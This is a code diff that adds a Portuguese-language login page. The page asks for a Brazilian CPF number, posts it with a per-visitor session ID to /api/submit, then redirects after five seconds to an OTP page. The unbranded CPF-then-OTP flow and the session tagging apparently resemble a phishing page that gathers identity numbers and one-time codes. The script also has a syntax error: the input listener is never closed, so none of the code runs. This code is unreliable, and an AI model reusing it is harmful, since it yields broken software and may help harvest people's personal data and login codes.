@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login – Informe seu CPF</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* ---- Minimal styling for the login page ---- */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 360px;
+            background: #fff;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0,0,0,.1);
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 8px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 18px;
+            text-align: center;
+        }
+        .cpf-input:focus {
+            border-color: #1db954;
+            box-shadow: 0 0 0 3px rgba(29,185,84,.2);
+        }
+        .continue-btn {
+            width: 100%;
+            margin-top: 20px;
+            padding: 12px;
+            background: #1db954;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .continue-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Informe seu CPF</h2>
+        <p>Digite apenas os números do seu CPF (11 dígitos).</p>
+
+        <div class="input-group">
+            <label for="cpfInput" class="cpf-input-hint">CPF</label>
+            <input type="text" id="cpfInput" class="cpf-input" maxlength="11" placeholder="00000000000">
+        </div>
+
+        <button id="continueBtn" class="continue-btn" disabled>Continuar</button>
+    </div>
+
+    <script>
+        // --------------------------------------------------------------
+        // 1️⃣  Ensure a unique sessionId for this user
+        // --------------------------------------------------------------
+        if (!localStorage.getItem('sessionId')) {
+            localStorage.setItem('sessionId',
+                Math.random().toString(36).substring(2, 15));
+        }
+        const sessionId = localStorage.getItem('sessionId');
+
+        // --------------------------------------------------------------
+        // 2️⃣  Cache DOM elements
+        // --------------------------------------------------------------
+        const cpfInput   = document.getElementById('cpfInput');
+        const continueBtn = document.getElementById('continueBtn');
+
+        // --------------------------------------------------------------
+        // 3️⃣  Validate CPF on each keystroke
+        // --------------------------------------------------------------
+        cpfInput.addEventListener('input', () => {
+            // Keep only digits
+            cpfInput.value = cpfInput.value.replace(/\D/g, '');
+
+            // Enable button only when we have exactly 11 digits
+            continueBtn.disabled = cpfInput.value.length !== 11;
+        }
+
+        // --------------------------------------------------------------
+        // 4️⃣  Handle “Continuar” click
+        // --------------------------------------------------------------
+        continueBtn.addEventListener('click', async () => {
+            const cpf = cpfInput.value;   // will always be 11 digits here
+
+            try {
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,               // <-- unique per user
+                        type: 'CPF_FOR_LOGIN',
+                        content: { cpf }
+                    })
+                });
+
+                if (response.ok) {
+                    // 5‑second pause before moving to the next step
+                    setTimeout(() => {
+                        window.location.href = '/otp.html';
+                    }, 5000);
+                } else {
+                    alert('Erro ao enviar CPF. Tente novamente.');
+                }
+            } catch (err) {
+                console.error(err);
+                alert('Erro de conexão. Verifique sua internet.');
+            }
+        });
+    </script>
+</body>
+</html>
